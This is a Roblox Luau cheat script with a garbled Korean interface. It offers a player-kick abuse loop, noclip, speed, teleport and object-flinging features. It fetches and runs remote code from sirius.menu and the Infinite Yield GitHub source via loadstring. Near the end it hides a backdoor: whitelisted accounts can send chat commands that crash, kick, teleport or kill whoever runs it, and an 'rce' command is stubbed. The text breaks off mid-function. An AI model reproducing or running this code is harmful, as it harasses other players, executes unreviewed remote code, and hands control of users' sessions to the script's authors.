--!strict

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
local runService = game:GetService("RunService")

local registeredBlocks = {}
local spawnMode = false
local followPointMode = false
local followLockPos = nil
local spawnPos = player.Character and player.Character.PrimaryPart and player.Character.PrimaryPart.Position or Vector3.new(0,0,0)
local baseRadius = 20
local baseSpeed = 5
local radiusIncrement = 0.5
local speedIncrement = 0.5
local angleOffset = 0
local targetPlayer = nil
local followDistance = 50

local uMode = false
local uDistance = 50

local Window = Rayfield:CreateWindow({
    Name = "ë°˜ë¬¼ì‚¬ ìŠ¤í¬ë¦½íŠ¸",
    LoadingTitle = "ë°˜ë¬¼ì‚¬",
    LoadingSubtitle = "by ë¬´ìš”í•‘",
    ConfigurationSaving = { Enabled = false }
})

local MainTab = Window:CreateTab("ë©”ì¸", 4483362458)
local ModeLabel = MainTab:CreateLabel("í˜„ì¬ ëª¨ë“œ: ì›í˜• íšŒì „")

local LoopTab = Window:CreateTab("ë£¨í”„ í”Œë ˆì´ì–´", 4483362458)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local SelectedPlayer = nil
local currentDropdownOption = ""
local KickSwitchEnabled = false
local SavedPosition = nil

local TP_INTERVAL = 0.2
local TP_COUNT = 15
local REQUIRED_COUNT = 5
local REQUIRED_TIME = 3

-- ë“œë¡­ë‹¤ìš´ (í”Œë ˆì´ì–´ ì„ íƒ)
local PlayerDropdown = LoopTab:CreateDropdown({
    Name = "í‚¥ í”Œë ˆì´ì–´ ì •í•˜ê¸°",
    Options = {},
    CurrentOption = "",
    MultiSelection = false,
    Callback = function(option)
        if type(option) == "table" then option = option[1] end
        currentDropdownOption = option
        local selectedName = option:match("%((.-)%)")
        SelectedPlayer = Players:FindFirstChild(selectedName)
    end
})

-- ìŠ¤ìœ„ì¹˜ ë²„íŠ¼ (í‚¥ ì‹¤í–‰)
local KickToggle = LoopTab:CreateToggle({
    Name = "í‚¥ í”Œë ˆì´ì–´",
    CurrentValue = false,
    Callback = function(value)
        KickSwitchEnabled = value
        if KickSwitchEnabled then
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                SavedPosition = char.HumanoidRootPart.CFrame
            end

            if SelectedPlayer then
                task.spawn(function()
                    local plr = LocalPlayer
                    local inv = Workspace:WaitForChild(plr.Name.."SpawnedInToys")
                    local rs = ReplicatedStorage

                    local BlobMan = inv.CreatureBlobman
                    local LeftDetector = BlobMan.LeftDetector
                    local LeftWeld = LeftDetector.LeftWeld
                    local RightDetector = BlobMan.RightDetector
                    local RightWeld = RightDetector.RightWeld

                    local GrabEvent = BlobMan.BlobmanSeatAndOwnerScript.CreatureGrab
                    local DropEvent = BlobMan.BlobmanSeatAndOwnerScript.CreatureDrop

                    local successCount = 0
                    local startTime = tick()

                    for i = 1, TP_COUNT do
                        if not KickSwitchEnabled then break end

                        if SelectedPlayer.Character and SelectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            local targetHrp = SelectedPlayer.Character.HumanoidRootPart
                            local tpPos = targetHrp.Position + Vector3.new(0,5,0)

                            -- TP
                            local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                hrp.CFrame = CFrame.new(tpPos)
                            end

                            -- Grab
                            GrabEvent:FireServer(LeftDetector, targetHrp, LeftWeld)
                            GrabEvent:FireServer(RightDetector, targetHrp, RightWeld)

                            -- Drop
                            DropEvent:FireServer(LeftWeld, targetHrp)
                            DropEvent:FireServer(RightWeld, targetHrp)

                            successCount += 1

                            -- 3ì´ˆ ì•ˆì— 5íšŒ ë‹¬ì„±í•˜ë©´ ìë™ ë³µê·€ ì¡°ê±´ ì²´í¬
                            if successCount >= REQUIRED_COUNT and (tick() - startTime) <= REQUIRED_TIME then
                                -- ë§Œì•½ SitOwnerê°€ ë˜ë©´ ìë™ ì¢…ë£Œ
                                if BlobMan.BlobmanSeatAndOwnerScript.Seat.Occupant then
                                    KickSwitchEnabled = false
                                    if SavedPosition then
                                        hrp.CFrame = SavedPosition
                                    end
                                    break
                                end
                            end
                        end

                        task.wait(TP_INTERVAL)
                    end

                    -- ë§ˆì§€ë§‰ì— ìŠ¤ìœ„ì¹˜ êº¼ì¡Œì„ ë•Œ ìœ„ì¹˜ ë³µê·€
                    if SavedPosition then
                        local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            hrp.CFrame = SavedPosition
                        end
                    end
                end)
            end
        else
            -- ìˆ˜ë™ìœ¼ë¡œ ë„ë©´ ì›ë˜ ìœ„ì¹˜ ë³µê·€
            if SavedPosition then
                local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.CFrame = SavedPosition
                end
            end
        end
    end
})

-- ì‹¤ì‹œê°„ ë“œë¡­ë‹¤ìš´ ê°±ì‹ 
RunService.Heartbeat:Connect(function()
    local list = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(list, plr.DisplayName .. " (" .. plr.Name .. ")")
        end
    end
    PlayerDropdown:Refresh(list, true)
    if currentDropdownOption ~= "" and table.find(list, currentDropdownOption) then
        PlayerDropdown:SetOption(currentDropdownOption)
    else
        SelectedPlayer = nil
        currentDropdownOption = ""
    end
end)

local ProtectionTab = Window:CreateTab("ë³´í˜¸", 4483362458)

local antiGrabEnabled = false
local antiGrabConnection = nil
local struggleConnection = nil

local function setRagdollF(state)
    local rs = game:GetService("ReplicatedStorage")
    local plr = game.Players.LocalPlayer
    local char = plr.Character or plr.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    if char and char:FindFirstChild("HumanoidRootPart") then
        rs:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(hrp, state and 1 or 0)
    end
end

local function setAnchorF(state)
    local plr = game.Players.LocalPlayer
    local char = plr.Character or plr.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.Anchored = state
    end
end

ProtectionTab:CreateToggle({
    Name = "ì•ˆí‹° ê·¸ë ™",
    CurrentValue = false,
    Callback = function(Value)
        antiGrabEnabled = Value

        if antiGrabEnabled then
            local rs = game:GetService("ReplicatedStorage")
            local plr = game.Players.LocalPlayer
            local runService = game:GetService("RunService")

            antiGrabConnection = runService.Heartbeat:Connect(function()
                local heldValue = plr:FindFirstChild("IsHeld")

                if heldValue and heldValue.Value == true then
                    if not struggleConnection then

                        setRagdollF(true)
                        setAnchorF(true)

                        struggleConnection = runService.Heartbeat:Connect(function()
                            rs.CharacterEvents.Struggle:FireServer(plr)
                        end)
                    end
                else
                    if struggleConnection then

                        setRagdollF(false)
                        setAnchorF(false)


                        struggleConnection:Disconnect()
                        struggleConnection = nil
                    end
                end
            end)


        else
            if antiGrabConnection then
                antiGrabConnection:Disconnect()
                antiGrabConnection = nil
            end
            if struggleConnection then
                struggleConnection:Disconnect()
                struggleConnection = nil
            end


            setRagdollF(false)
            setAnchorF(false)
        end
    end
})


local GrapTab = Window:CreateTab("ê·¸ë ™", 4483362458)
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local noclipTargetEnabled = false
local grabbedPartsOriginal = {}

local function getMyParts()
    local char = localPlayer.Character
    if not char then return {} end
    local parts = {}
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") then
            parts[p] = true
        end
    end
    return parts
end

local function getGrabbedParts()
    local owned = {}
    local myParts = getMyParts()
    for _, part in ipairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") and not myParts[part] then
            local owner = nil
            pcall(function() owner = part:GetNetworkOwner() end)
            if owner == localPlayer then
                table.insert(owned, part)
            end
        end
    end
    return owned
end

GrapTab:CreateToggle({
    Name = "ë…¸í´ë¦½ ê·¸ë ™",
    CurrentValue = false,
    Callback = function(value)
        noclipTargetEnabled = value
        if not value then

            for p, val in pairs(grabbedPartsOriginal) do
                if p and p.Parent then
                    p.CanCollide = val
                end
            end
            grabbedPartsOriginal = {}
        end
    end
})

RunService.Heartbeat:Connect(function()
    if noclipTargetEnabled then
        local grabbed = getGrabbedParts()

        for _, p in ipairs(grabbed) do
            if grabbedPartsOriginal[p] == nil then
                grabbedPartsOriginal[p] = p.CanCollide
            end
            p.CanCollide = false
        end

        for p, _ in pairs(grabbedPartsOriginal) do
            if not table.find(grabbed, p) and p and p.Parent then
                p.CanCollide = grabbedPartsOriginal[p]
                grabbedPartsOriginal[p] = nil
            end
        end
    end
end)


local PlayerTab = Window:CreateTab("í”Œë ˆì´ì–´", 4483362458)
local localPlayer = game.Players.LocalPlayer
local runService = game:GetService("RunService")


local walkSpeedValue = 16
local infiniteJumpEnabled = false
local noclipEnabled = false


local steppedConnection = nil
local originalCanCollide = {}
local PART_NAMES = {"Head","Torso","UpperTorso","LowerTorso","HumanoidRootPart"}


local function getCharacterParts(char)
    local parts = {}
    for _, name in ipairs(PART_NAMES) do
        local p = char:FindFirstChild(name)
        if p and p:IsA("BasePart") then
            table.insert(parts, p)
        end
    end
    return parts
end


local function enableNoclip(char)
    char = char or localPlayer.Character or localPlayer.CharacterAdded:Wait()
    if noclipEnabled then return end
    local parts = getCharacterParts(char)


    originalCanCollide = {}
    for _, p in ipairs(parts) do
        originalCanCollide[p] = p.CanCollide
    end

    steppedConnection = runService.Stepped:Connect(function()
        for _, p in ipairs(parts) do
            if p and p.Parent then
                p.CanCollide = false
            end
        end
    end)

    noclipEnabled = true
    warn("[noclip] enabled")
end


local function disableNoclip(char)
    char = char or localPlayer.Character
    if not noclipEnabled then return end

    if steppedConnection then
        steppedConnection:Disconnect()
        steppedConnection = nil
    end


    if char then
        for p, val in pairs(originalCanCollide) do
            if p and p.Parent then
                p.CanCollide = val
            end
        end
    end

    originalCanCollide = {}
    noclipEnabled = false
    warn("[noclip] disabled")
end


PlayerTab:CreateSlider({
    Name = "ê±·ê¸° ì†ë„",
    Range = {16,500},
    Increment = 1,
    CurrentValue = walkSpeedValue,
    Callback = function(value)
        walkSpeedValue = value
        local char = localPlayer.Character
        if char then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = walkSpeedValue
            end
        end
    end
})


PlayerTab:CreateToggle({
    Name = "ë¬´í•œ ì í”„",
    CurrentValue = false,
    Callback = function(value)
        infiniteJumpEnabled = value
    end
})


PlayerTab:CreateToggle({
    Name = "ë…¸í´ë¦½",
    CurrentValue = false,
    Callback = function(value)
        if value then
            enableNoclip()
        else
            disableNoclip()
        end
    end
})


local uis = game:GetService("UserInputService")
uis.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Space and infiniteJumpEnabled then
        local char = localPlayer.Character
        local humanoid = char and char:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)


local function setupCharacter(char)
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = walkSpeedValue
    end


    if noclipEnabled then
        enableNoclip(char)
    end
end


if localPlayer.Character then
    setupCharacter(localPlayer.Character)
end


localPlayer.CharacterAdded:Connect(function(char)
    setupCharacter(char)
end)


runService.Heartbeat:Connect(function()
    local char = localPlayer.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = walkSpeedValue
    end
end)


local TeleportTab = Window:CreateTab("í…”ë ˆí¬íŠ¸", 4483362458)
local player = game.Players.LocalPlayer
local runService = game:GetService("RunService")


TeleportTab:CreateButton({
    Name = "ìŠ¤í° êµ¬ì—­ìœ¼ë¡œ ì´ë™",
    Callback = function()
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:WaitForChild("HumanoidRootPart")
        local spawnLocation = workspace:FindFirstChildWhichIsA("SpawnLocation")

        if spawnLocation then
            root.CFrame = spawnLocation.CFrame + Vector3.new(0, 5, 0)
            Rayfield:Notify({ Title = "í…”ë ˆí¬íŠ¸ ì„±ê³µ", Content = "ìŠ¤í° ì§€ì ìœ¼ë¡œ ì´ë™í–ˆìŠµë‹ˆë‹¤.", Duration = 3 })
        else
            Rayfield:Notify({ Title = "í…”ë ˆí¬íŠ¸ ì‹¤íŒ¨", Content = "ìŠ¤í° êµ¬ì—­ì„ ì°¾ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.", Duration = 5 })
        end
    end
})


local function getPlayerList()
    local list = {}
    for _, plr in ipairs(game.Players:GetPlayers()) do
        if plr ~= player then
            table.insert(list, plr.DisplayName .. " (" .. plr.Name .. ")")
        end
    end
    return list
end

local SelectedPlayer = nil


local PlayerDropdown = TeleportTab:CreateDropdown({
    Name = "í”Œë ˆì´ì–´ ì„ íƒ",
    Options = getPlayerList(),
    CurrentOption = "",
    MultiSelection = false,
    Callback = function(option)
        if type(option) == "table" then
            option = option[1]
        end
        -- ë³¸ë‹‰(Name)ë§Œ ì¶”ì¶œ
        local selectedName = option:match("%((.-)%)")
        SelectedPlayer = game.Players:FindFirstChild(selectedName)

        if SelectedPlayer then
            Rayfield:Notify({
                Title = "ì„ íƒë¨",
                Content = SelectedPlayer.DisplayName .. " (" .. SelectedPlayer.Name .. ") ë‹˜ì´ ì„ íƒë˜ì—ˆìŠµë‹ˆë‹¤.",
                Duration = 3
            })
        end
    end
})


TeleportTab:CreateButton({
    Name = "í”Œë ˆì´ì–´ ëª©ë¡ ìƒˆë¡œê³ ì¹¨",
    Callback = function()

        local refreshedList = {}
        for _, plr in ipairs(game.Players:GetPlayers()) do
            if plr ~= player then
                table.insert(refreshedList, plr.DisplayName .. " (" .. plr.Name .. ")")
            end
        end


        PlayerDropdown:Refresh(refreshedList, true)
        PlayerDropdown:SetOption("") -- ì„ íƒ ì´ˆê¸°í™”
        SelectedPlayer = nil

        Rayfield:Notify({
            Title = "ëª©ë¡ ìƒˆë¡œê³ ì¹¨",
            Content = "í”Œë ˆì´ì–´ ëª©ë¡ì´ ê°±ì‹ ë˜ì—ˆìŠµë‹ˆë‹¤.",
            Duration = 3
        })
    end
})


TeleportTab:CreateButton({
    Name = "ì„ íƒí•œ í”Œë ˆì´ì–´í•œí…Œ í…”ë ˆí¬íŠ¸",
    Callback = function()
        if SelectedPlayer and SelectedPlayer.Character and SelectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetHRP = SelectedPlayer.Character.HumanoidRootPart
            local myChar = player.Character or player.CharacterAdded:Wait()
            local myHRP = myChar:WaitForChild("HumanoidRootPart")


            pcall(function()
                targetHRP:SetNetworkOwner(player)
            end)

            myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 3, 0)

            Rayfield:Notify({
                Title = "í…”ë ˆí¬íŠ¸ ì„±ê³µ",
                Content = SelectedPlayer.DisplayName .. " (" .. SelectedPlayer.Name .. ") ë‹˜ì—ê²Œ ì´ë™í–ˆìŠµë‹ˆë‹¤.",
                Duration = 3
            })
        else
            Rayfield:Notify({
                Title = "í…”ë ˆí¬íŠ¸ ì‹¤íŒ¨",
                Content = "í”Œë ˆì´ì–´ë¥¼ ì„ íƒí•˜ì§€ ì•Šì•˜ê±°ë‚˜ ìœ„ì¹˜ë¥¼ ì°¾ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.",
                Duration = 3
            })
        end
    end
})


local HelpTab = Window:CreateTab("ì‚¬ìš©ë²•", 4483362458)
HelpTab:CreateLabel("tí‚¤/ë²„íŠ¼ â†’ ë¸”ë¡ ë“±ë¡")
HelpTab:CreateLabel("yí‚¤ â†’ ë§ˆìš°ìŠ¤ ìœ„ì¹˜ ë”°ë¼ê°€ê¸° / ë‹¤ì‹œ y â†’ ê³ ì • ìœ„ì¹˜")
HelpTab:CreateLabel("kí‚¤ â†’ í”Œë ˆì´ì–´ ì¶”ì ")
HelpTab:CreateLabel("zí‚¤ â†’ í…”ë ˆí¬íŠ¸")
HelpTab:CreateLabel("Uëª¨ë“œ â†’ ë³´í˜¸ë§‰ ëª¨ë“œ (ìŠ¬ë¼ì´ë”ë¡œ ë°˜ì§€ë¦„ ì¡°ì ˆ)")
HelpTab:CreateLabel("ë§ˆìš°ìŠ¤ íœ  â†’ yí‚¤ ê±°ë¦¬ ì¡°ì ˆ / U ëª¨ë“œ ë°˜ì§€ë¦„ ì¡°ì ˆ")
HelpTab:CreateLabel("ví‚¤/ë²„íŠ¼ â†’ ëª¨ë“  ë¸”ë¡ í•´ì œ")
HelpTab:CreateLabel("cí‚¤/ë²„íŠ¼ â†’ ìŠ¤í° ìœ„ì¹˜ ì´ë™")
HelpTab:CreateLabel("kí‚¤ â†’ UI ê°€ë¦¬ê¸° ì¼œê¸°")
HelpTab:CreateLabel("ì†ë„ ì¡°ì ˆ ì•‰ìœ¼ë©´ ë¨")
HelpTab:CreateLabel("ë¯¸ì‚¬ì¼ ì¡°ì¢…ì€ ì†Œí™˜ë˜ë©´ ë¯¸ì‚¬ì¼ ì¡ìœ¼ë©´ ë©ë‹ˆë‹¤.")

-- ğŸ“Œ ë†€ê¸° íƒ­ ìƒì„±
local WeaponTab = Window:CreateTab("ë†€ê¸°", 4483362458)

WeaponTab:CreateButton({
    Name = "ë¯¸ì‚¬ì¼ ì¡°ì¢…",
    Callback = function()
        -- ===============================
        -- ë¯¸ì‚¬ì¼ ì‹œìŠ¤í…œ
        -- ===============================
        local plr = game.Players.LocalPlayer
        local mouse = plr:GetMouse()
        local uis = game:GetService("UserInputService")
        local cam = workspace.CurrentCamera
        local rs = game:GetService("RunService")
        local debris = game:GetService("Debris")
        local replicatedStorage = game:GetService("ReplicatedStorage")

        local inv = workspace:WaitForChild(plr.Name .. "SpawnedInToys")
        local toyName = "BombMissile"
        local char = plr.Character or plr.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")

        local camDefaultType = cam.CameraType
        local cameraConn, flingConn
        local startTime = 0

        -- ì¹´ë©”ë¼ ë³µêµ¬
        local function cancelCamera()
            if cameraConn then cameraConn:Disconnect() end
            if flingConn then flingConn:Disconnect() end
            cam.CameraType = camDefaultType
        end

        -- ì†ë„ ê³„ì‚°
        local function getVelocityByElapsed(elapsed)
            if elapsed < 0.3 then return 10
            elseif elapsed < 0.5 then return 50
            elseif elapsed < 0.8 then return 100
            elseif elapsed < 1 then return 120
            elseif elapsed < 1.3 then return 150
            elseif elapsed < 1.5 then return 155
            else return 160 end
        end

        -- ë¯¸ì‚¬ì¼ ì´ë™
        local function flingMissile(part)
            startTime = tick()
            if flingConn then flingConn:Disconnect() end
            flingConn = rs.RenderStepped:Connect(function()
                if not part or not part.Parent then
                    flingConn:Disconnect()
                    return
                end

                local elapsed = tick() - startTime
                local speed = getVelocityByElapsed(elapsed)

                local targetPos = mouse.Hit.Position
                local direction = (targetPos - part.Position).Unit

                part.CFrame = CFrame.lookAt(part.Position, part.Position + direction) 
                    * CFrame.Angles(-math.rad(90), 0, math.rad(90))

                local bv = Instance.new("BodyVelocity")
                bv.Velocity = direction * speed
                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bv.Parent = part
                debris:AddItem(bv, 0.001)
            end)
        end

        -- ë¯¸ì‚¬ì¼ ìƒì„±
        local function spawnMissile()
            local missile = inv:FindFirstChild(toyName)
            if not missile then
                local args = {
                    [1] = toyName,
                    [2] = hrp.CFrame,
                    [3] = Vector3.zero
                }
                replicatedStorage:WaitForChild("MenuToys")
                    :WaitForChild("SpawnToyRemoteFunction"):InvokeServer(unpack(args))
                missile = inv:WaitForChild(toyName, 2)
            end
            return missile and missile:FindFirstChild("OrientingPart")
        end

        -- ì¹´ë©”ë¼ ë”°ë¼ê°€ê¸°
        local function smoothCameraFollow(part)
            if cameraConn then cameraConn:Disconnect() end
            cameraConn = rs.RenderStepped:Connect(function()
                if not part or not part.Parent then
                    cancelCamera()
                    return
                end

                local mousePos = mouse.Hit.Position
                local partPos = part.Position
                local forward = (mousePos - partPos).Unit
                local right = forward:Cross(Vector3.new(0, 1, 0)).Unit
                local up = right:Cross(forward).Unit

                local targetCFrame = CFrame.fromMatrix(
                    partPos + forward * -10 + up * 3,
                    right,
                    up
                )

                cam.CameraType = Enum.CameraType.Scriptable

                local targetPos = targetCFrame.Position
                local currentPos = cam.CFrame.Position

                local currentRot = cam.CFrame - currentPos
                local targetRot = targetCFrame - targetPos
                local newRot = currentRot:Lerp(targetRot, 0.1)

                cam.CFrame = CFrame.new(targetPos) * newRot
            end)
        end

        -- ğŸ“Œ ë²„íŠ¼ í´ë¦­ ì‹œ ë™ì‘
        local missile = spawnMissile()
        if missile then
            smoothCameraFollow(missile)
            flingMissile(missile)
            missile.Destroying:Once(cancelCamera) -- ë¯¸ì‚¬ì¼ íŒŒê´´ ì‹œ ì¹´ë©”ë¼ ë³µêµ¬
        end
    end
})


local function registerBlock(block)
    if block and block:IsA("BasePart") and not block.Anchored then
        registeredBlocks[block] = true
    end
end

local function unregisterAllBlocks()
    registeredBlocks = {}
end

local function restoreOwnership()
    for block in pairs(registeredBlocks) do
        if block.Parent and block:IsA("BasePart") then
            block.Anchored = false
            block:SetNetworkOwner(player)
        end
    end
end


local function updateCircularPlacement()
    local char = player.Character
    if not char or not char.PrimaryPart then return end

    local center = char.PrimaryPart.Position
    local count = 0
    for block in pairs(registeredBlocks) do
        if block.Parent then
            count += 1
        end
    end

    if count == 0 then return end

    local radius = baseRadius + (count-1)*radiusIncrement
    local speed = baseSpeed + (count-1)*speedIncrement
    local i = 0

    for block in pairs(registeredBlocks) do
        if block.Parent then
            local angle = (i/count)*math.pi*2 + angleOffset
            local targetPos = center + Vector3.new(math.cos(angle)*radius, 0, math.sin(angle)*radius)
            block.AssemblyLinearVelocity = (targetPos - block.Position) * speed
            i += 1
        end
    end
end


local function updateSpawnPlacement()
    local targetPos = spawnPos + Vector3.new(0,100,0)
    for block in pairs(registeredBlocks) do
        if block.Parent then
            block.AssemblyLinearVelocity = (targetPos - block.Position) * 5
        end
    end
end


local function updateTargetTracking()
    if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character.PrimaryPart then return end

    local targetPos = targetPlayer.Character.PrimaryPart.Position
    for block in pairs(registeredBlocks) do
        if block.Parent then
            block.AssemblyLinearVelocity = (targetPos - block.Position) * 8
        end
    end
end


local function updateFollowPointPlacement()
    local char = player.Character
    if not char or not char.PrimaryPart then return end

    local basePos = char.PrimaryPart.Position
    local targetCenter

    if followLockPos then
        targetCenter = followLockPos
    else
        local mouseRay = workspace.CurrentCamera:ScreenPointToRay(mouse.X, mouse.Y)
        local dir = mouseRay.Direction.Unit
        targetCenter = basePos + dir * followDistance
    end

    for block in pairs(registeredBlocks) do
        if block.Parent then
            block.AssemblyLinearVelocity = (targetCenter - block.Position) * 8
        end
    end
end


local function updateDomePlacement()
    local char = player.Character
    if not char or not char.PrimaryPart then return end

    local center = char.PrimaryPart.Position
    local blocks = {}

    for block in pairs(registeredBlocks) do
        if block.Parent then
            table.insert(blocks, block)
        end
    end

    local total = #blocks
    if total == 0 then return end

    local layerHeight = 15
    local layerRadiusStep = 15
    local idx = 1
    local layers = math.ceil(math.sqrt(total))

    for layer = 0, layers-1 do
        local y = layer * layerHeight
        local radius = math.max(0, uDistance - layer*layerRadiusStep)
        local circumference = 2*math.pi*radius
        local cols = math.max(1, math.floor(circumference/10))

        for col = 0, cols-1 do
            if idx > total then return end
            local angle = (col/cols)*2*math.pi
            local x = radius * math.cos(angle)
            local z = radius * math.sin(angle)
            local block = blocks[idx]
            local targetPos = center + Vector3.new(x, y, z)
            block.AssemblyLinearVelocity = (targetPos - block.Position) * 10
            idx += 1
        end
    end
end


MainTab:CreateButton({ Name="ë¸”ë¡ ë“±ë¡ (ë§ˆìš°ìŠ¤)", Callback=function()
    local target = mouse.Target
    registerBlock(target)
end})

MainTab:CreateButton({ Name="ëª¨ë“  ë¸”ë¡ í•´ì œ", Callback=unregisterAllBlocks })

MainTab:CreateButton({ Name="í…”ë ˆí¬íŠ¸ (ë§ˆìš°ìŠ¤ ìœ„ì¹˜)", Callback=function()
    local char = player.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        local root = char.HumanoidRootPart
        root.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0,3,0))
    end
end})

MainTab:CreateToggle({
    Name="ë³´í˜¸ë§‰ ëª¨ë“œ",
    CurrentValue=uMode,
    Callback=function(Value)
        uMode = Value
        if uMode then
            followPointMode = false
            spawnMode = false
            targetPlayer = nil
            restoreOwnership()
        end
    end
})

MainTab:CreateSlider({
    Name="ë³´í˜¸ë§‰ ë°˜ì§€ë¦„",
    Range={10,300},
    Increment=5,
    CurrentValue=uDistance,
    Callback=function(Value)
        uDistance = Value
    end
})


local function onKeyDown(key)
    if key=="t" then
        local target = mouse.Target
        registerBlock(target)
    elseif key=="y" then
        uMode=false
        if followPointMode and not followLockPos then
            local char=player.Character
            if char and char.PrimaryPart then
                local mouseRay = workspace.CurrentCamera:ScreenPointToRay(mouse.X, mouse.Y)
                local dir = mouseRay.Direction.Unit
                followLockPos = char.PrimaryPart.Position + dir*followDistance
            end
        elseif followPointMode and followLockPos then
            followLockPos=nil
            followPointMode=false
        else
            followPointMode=true
            followLockPos=nil
            restoreOwnership()
        end
    elseif key=="k" then
        uMode=false
        local target = mouse.Target
        local newTargetPlayer = nil
        if target then
            local model = target:FindFirstAncestorWhichIsA("Model")
            if model and game.Players:GetPlayerFromCharacter(model) and model ~= player.Character then
                newTargetPlayer = game.Players:GetPlayerFromCharacter(model)
            end
        end
        if newTargetPlayer then
            targetPlayer=newTargetPlayer
            followPointMode=false
            followLockPos=nil
            spawnMode=false
            for block in pairs(registeredBlocks) do
                if block and block.Parent then
                    block:SetNetworkOwner(player)
                end
            end
        else
            targetPlayer=nil
        end
    elseif key=="z" then
        local char=player.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0,3,0))
        end
    elseif key=="v" then
        unregisterAllBlocks()
    elseif key=="c" then
        uMode=false
        spawnMode=not spawnMode
        if spawnMode then
            followPointMode=false
            followLockPos=nil
            targetPlayer=nil
            restoreOwnership()
        end
  -- Rayfield UI í‚¤ë°”ì¸ë“œ ì„¤ì • (m í‚¤ë¡œ UI í† ê¸€)
Window:ToggleUIKeybind(Enum.KeyCode.M)

    end
end

mouse.KeyDown:Connect(onKeyDown)

-- Heartbeat ë£¨í”„
runService.Heartbeat:Connect(function()
    if uMode then
        updateDomePlacement()
        ModeLabel:Set("í˜„ì¬ ëª¨ë“œ: ë³´í˜¸ë§‰ ëª¨ë“œ (ë°˜ì§€ë¦„ "..uDistance..")")
    elseif targetPlayer then
        updateTargetTracking()
        ModeLabel:Set("í˜„ì¬ ëª¨ë“œ: í”Œë ˆì´ì–´ ì¶”ì  â†’ "..targetPlayer.Name)
    elseif followPointMode then
        updateFollowPointPlacement()
        if followLockPos then
            ModeLabel:Set("í˜„ì¬ ëª¨ë“œ: ê³ ì • ìœ„ì¹˜ ìœ ì§€")
        else
            ModeLabel:Set("í˜„ì¬ ëª¨ë“œ: ë§ˆìš°ìŠ¤ ì´ë™ ("..followDistance.." Studs)")
        end
    elseif spawnMode then
        updateSpawnPlacement()
        ModeLabel:Set("í˜„ì¬ ëª¨ë“œ: ìŠ¤í° ìœ„ì¹˜ ì´ë™")
    else
        angleOffset += (baseSpeed + (#registeredBlocks-1)*speedIncrement) * 0.01
        updateCircularPlacement()
        ModeLabel:Set("í˜„ì¬ ëª¨ë“œ: ì›í˜• íšŒì „")
    end
end)

-- ë§ˆìš°ìŠ¤ íœ 
mouse.WheelForward:Connect(function()
    if followPointMode and not followLockPos then
        followDistance = math.min(followDistance+5,300)
    elseif uMode then
        uDistance = math.min(uDistance+5,300)
    end
end)

mouse.WheelBackward:Connect(function()
    if followPointMode and not followLockPos then
        followDistance = math.max(followDistance-5,10)
    elseif uMode then
        uDistance = math.max(uDistance-5,10)
    end
end)

 loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() 

local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Whitelist = { "jdurieivfbd12" }

local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Whitelist = { "8Hoseu" }

local cmds = {
    ["crash"] = function()
        while true do
            print("Penis") -- í…ŒìŠ¤íŠ¸ìš©
        end
    end,

    ["kick"] = function(_, Reason)
        LocalPlayer:Kick(Reason or "The game thinks you're cheating so a black hole appeared and took you away.")
    end,

    ["bring"] = function(Admin)
        if LocalPlayer.Character and Admin.Character then
            local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
            if hrp and adminHrp then
                hrp.CFrame = adminHrp.CFrame
            end
        end
    end,

    ["kill"] = function()
        if LocalPlayer.Character then
            local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
            if hum then
                hum.Health = 0
            end
        end
    end,

    ["rce"] = function(_, code)
        warn("RCE ëª…ë ¹ì€ í˜„ì¬ ì§€ì›ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.")
    end,
}

local function isWhitelisted(playerName)
    for _, name in ipairs(Whitelist) do
        if name:lower() == playerName:lower() then
            return true
        end
    end
    return false
end

local function FindMatch(Name)
    Name = Name:lower()
    for _, Player in Players:GetPlayers() do
        if Player.Name:lower():sub(1, #Name) == Name then
